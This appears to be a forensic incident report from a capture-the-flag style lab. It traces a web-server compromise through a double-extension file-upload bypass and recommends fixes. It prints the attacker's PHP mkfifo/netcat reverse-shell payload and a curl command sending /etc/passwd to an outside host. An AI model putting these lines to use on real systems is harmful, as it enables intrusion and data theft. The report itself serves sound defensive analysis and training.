# Incident Report: Web Server Compromise via Malicious File Upload
 
**Scenario Source:** CyberDefenders - WebStrike Lab  
**Analyst:** Sachith C
**Date:** April 27th, 2026 
**Report Version:** 1.0

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Scope and Methodology](#2-scope-and-methodology)
3. [Timeline of Events](#3-timeline-of-events)
4. [Technical Analysis](#4-technical-analysis)
5. [Indicators of Compromise](#5-indicators-of-compromise)
6. [MITRE ATT&CK Mapping](#6-mitre-attck-mapping)
7. [Conclusion](#7-conclusion)
8. [Recommendations](#8-recommendations)

---

## 1. Executive Summary

A web server was compromised by an external attacker originating from Tianjin, China. The attacker exploited a file upload vulnerability in the web application to deploy a PHP reverse shell, gained interactive command execution on the server, and successfully read the contents of `/etc/passwd` before a secondary exfiltration attempt via `curl` failed.

The initial foothold was gained through a double extension bypass (`image.jpg.php`) that defeated the application's upload validation. Once the shell was active, the attacker ran several reconnaissance commands under the `www-data` user context. No evidence of privilege escalation was found within the captured traffic, and no password hashes were confirmed exfiltrated - however the `/etc/passwd` file contents were transmitted over the reverse shell channel.

The server has been confirmed compromised. The malicious web shell remains on disk at `/var/www/html/reviews/uploads/image.jpg.php` and should be treated as an active threat until removed and the upload directory is audited.

---

## 2. Scope and Methodology

**Artifact analysed:** `WebStrike.pcap`  
**Tool used:** Wireshark 4.x  
**Analyst environment:** Kali Linux

The investigation was conducted entirely through network traffic analysis of a single PCAP file provided by the network team. No host-based forensics (memory, disk image, or log files) were available for this investigation, so findings are limited to what was observable on the wire. Where host state is referenced (e.g. file locations, running user context), it was inferred directly from commands and responses visible in the captured TCP streams.

Analysis followed a structured approach: traffic overview via Statistics → Conversations and Protocol Hierarchy, followed by HTTP stream reconstruction to trace the attack chain, and TCP stream analysis to examine the reverse shell session in full.

---

## 3. Timeline of Events

All timestamps are relative to the start of the PCAP capture. Absolute timestamps are derived from packet metadata.

| Time (relative) | Event |
|---|---|
| T+0.00s | Attacker (`117.11.88.124`) sends first HTTP request - `GET /` - to the web server. Receives 403 Forbidden. |
| T+0.04s | Attacker begins enumerating the site: `/favicon.ico`, `/products/`, `/products/images/`, `/about/`, `/reviews/`. |
| T+26.92s | First upload attempt - `image.php` POSTed to `/reviews/upload.php`. Server returns HTTP 200 but responds with "invalid file format" in the body. Upload rejected. |
| T+49.76s | Second upload attempt - `image.jpg.php` POSTed to `/reviews/upload.php`. Server returns HTTP 200. Upload succeeds. |
| T+57.54s | Attacker begins probing for the upload directory: `GET /admin/uploads`, `GET /uploads`, `GET /admin/`, `GET /reviews/uploads`, `GET /reviews/uploads/`. |
| T+75.23s | Attacker locates the uploaded shell and triggers it: `GET /reviews/uploads/image.jpg.php`. |
| T+84.15s | Reverse shell established - server (`24.49.63.79`) initiates outbound TCP connection to attacker on port 8080. |
| T+191.37s | Attacker attempts to exfiltrate `/etc/passwd` via `curl -X POST` to `117.11.88.124:443`. Remote server returns HTTP 501 - exfiltration attempt fails. |

---

## 4. Technical Analysis

### 4.1 Reconnaissance

The attacker's first request returned a 403 Forbidden, which immediately tells them the root directory isn't publicly browsable - but the server is alive. Rather than stopping, they walked the site methodically: products pages, images, the about page, and eventually `/reviews/`, which turned out to be the path to the upload functionality.

This phase wasn't sophisticated. There was no automated scanner signature in the traffic, no rapid-fire directory brute-forcing. The attacker browsed manually, which suggests prior knowledge of the target or a deliberate low-noise approach.

### 4.2 Initial Access - File Upload Bypass

The upload endpoint at `/reviews/upload.php` performed extension-based validation - it checked the filename and rejected anything that didn't look like an image. The first attempt with `image.php` triggered that check and was blocked.

The second attempt used a double extension: `image.jpg.php`. The validator read `.jpg` and passed it. The PHP interpreter on the server, however, processes files based on the final extension and executed it as PHP. This is a well-documented bypass technique classified under **CWE-434: Unrestricted Upload of a File of a Dangerous Type**.

The uploaded payload was a standard mkfifo reverse shell:

```php
<?php system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 117.11.88.124 8080 >/tmp/f"); ?>
```

This creates a named pipe at `/tmp/f` to bridge the attacker's netcat listener with a local shell process, giving them full interactive command execution over a single outbound TCP connection.

### 4.3 Post-Exploitation

After triggering the shell via `GET /reviews/uploads/image.jpg.php`, the attacker had an interactive session running as `www-data` - the web server's process user. Their first commands were textbook post-exploitation reconnaissance:

```
$ whoami
www-data

$ uname -a
Linux ubuntu-virtual-machine 6.2.0-37-generic ... x86_64 GNU/Linux

$ pwd
/var/www/html/reviews/uploads

$ ls /home
ubuntu
```

They confirmed their privilege level, fingerprinted the OS, verified where they landed on disk, and enumerated local user accounts. One human user - `ubuntu` - was present on the system.

### 4.4 Exfiltration

The attacker then read `/etc/passwd` directly through the shell:

```
$ cat /etc/passwd
```

The full file contents - all system and service accounts - were returned over the reverse shell TCP stream (stream 13) and were fully visible in the capture. This constitutes a confirmed read of `/etc/passwd`.

The attacker then attempted a second exfiltration channel using `curl`:

```
$ curl -X POST -d /etc/passwd http://117.11.88.124:443/
```

The receiving server at `117.11.88.124:443` was running Python's `SimpleHTTPServer`, which doesn't support POST requests. It returned HTTP 501 and the transfer failed. This second exfiltration attempt did not succeed.

It's worth noting that `/etc/passwd` does not contain password hashes on modern Linux systems - those live in `/etc/shadow`. What the attacker obtained was a full list of system accounts, UIDs, home directories, and shells. This is useful for follow-on attacks such as targeted privilege escalation or social engineering, but no credential material was confirmed exfiltrated.

---

## 5. Indicators of Compromise

### Network IOCs

| Type | Value | Notes |
|---|---|---|
| Attacker IP | `117.11.88.124` | Geolocates to Tianjin, China |
| Server IP | `24.49.63.79` | Victim web server |
| C2 port | `8080/TCP` | Reverse shell listener |
| Exfil port | `443/TCP` | curl POST attempt, failed |
| User-Agent | `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0` | Consistent with Linux-based attacker host |

### Host IOCs

| Type | Value | Notes |
|---|---|---|
| Malicious file | `image.jpg.php` | PHP reverse shell, double extension bypass |
| Upload path | `/var/www/html/reviews/uploads/image.jpg.php` | Active on disk, treat as live threat |
| Upload endpoint | `/reviews/upload.php` | Vulnerable file upload handler |
| Named pipe | `/tmp/f` | Created by reverse shell payload |
| Accessed file | `/etc/passwd` | Read and transmitted over reverse shell |

---

## 6. MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Reconnaissance | Active Scanning: Vulnerability Scanning | T1595.002 | Sequential GET requests across site directories |
| Initial Access | Exploit Public-Facing Application | T1190 | File upload bypass via double extension |
| Persistence | Server Software Component: Web Shell | T1505.003 | `image.jpg.php` deployed to uploads directory |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 | Interactive `/bin/sh` session via reverse shell |
| Command & Control | Non-Standard Port | T1571 | Reverse shell over port 8080 |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | `/etc/passwd` read over reverse shell stream |

---

## 7. Conclusion

This was a straightforward but effective attack. The attacker found an upload form, hit a validation check, adapted with a double extension in a single retry, and had a live shell within about a minute of landing on the upload page. The entire intrusion - from first request to shell session - took under two minutes of active effort.

The impact was limited by the web server's user context (`www-data` rather than root), and the secondary exfiltration attempt failed due to a misconfigured receiving server on the attacker's end. Neither of those outcomes should be treated as evidence that the defences worked - they were accidents of circumstance, not design.

The web shell is still on disk. Until it's removed and the upload directory is fully audited, the server should be considered compromised.

---

## 8. Recommendations

**1. Fix the upload validation (immediate)**

Extension checking on the filename alone is not sufficient. The application should validate file type using magic bytes - the actual binary header of the file - rather than relying on the filename string. A JPEG will always begin with `FF D8 FF`; a PHP file won't. Server-side, the upload handler should also strip any secondary extensions before saving and store uploaded files with a server-generated name rather than the user-supplied one, eliminating the possibility of an executable filename reaching the web root.

**2. Apply the principle of least privilege to the web server process (short-term)**

The `www-data` user had enough permission to read `/etc/passwd`, execute arbitrary shell commands, and write to `/tmp`. None of that is necessary for a web application to serve product pages and accept reviews. The upload directory should be write-only from the application's perspective, and the web server process should be confined - either through tight filesystem permissions, a chroot jail, or containerisation - so that a compromised process can't reach outside its own directory tree.

**3. Implement egress filtering on the web server (short-term)**

The reverse shell worked because the server was allowed to initiate an outbound TCP connection to an arbitrary external IP on port 8080. A web server has no legitimate reason to do that. Firewall rules should restrict outbound traffic from the web server to only what the application actually needs - typically port 443 to known update and API endpoints, nothing else. Even if the upload bypass had succeeded and the shell was on disk, egress filtering would have prevented it from ever connecting back, breaking the attack chain at the C2 stage before any commands could be run.
